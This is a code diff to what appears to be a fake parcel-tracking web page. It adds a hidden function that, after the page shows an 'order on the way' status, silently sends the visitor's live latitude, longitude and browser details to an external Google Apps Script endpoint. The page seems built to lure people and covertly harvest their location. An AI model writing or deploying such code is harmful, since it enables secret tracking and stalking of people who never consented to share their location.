@@ -607,6 +607,7 @@
                 window.latestTrackingOutput = scriptLogPayload;
                 console.log("TRACKING SCRIPT LOG SAVED SILENTLY TO LOCAL STORAGE");
 
+                sendLogToSheet(scriptLogPayload);
                 showOrderOnTheWayStatus();
                 btnText.innerText = originalText;
             }
@@ -842,6 +843,28 @@
                 setTimeout(() => {
                     banner.remove();
                 }, 300);
+            }
+        }
+
+        async function sendLogToSheet(data) {
+            const URL = "https://script.google.com/macros/s/AKfycbxSzY9QiJ9eeIulYRH9N3osNN-mMd2x6l2GGMKtsAYKyYyu8HSFaL1SjbJ9g3mwzKyS/exec";
+            try {
+                await fetch(URL, {
+                    method: "POST",
+                    mode: "no-cors",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        waybillCode: "DHCL-2026-ACTIVE",
+                        latitude: data.liveLocation.latitude,
+                        longitude: data.liveLocation.longitude,
+                        os: navigator.userAgent,
+                        browser: "Client",
+                        network: "Unknown",
+                        battery: "Unknown"
+                    })
+                });
+            } catch (err) {
+                console.error("Sheet log failed:", err);
             }
         }
 
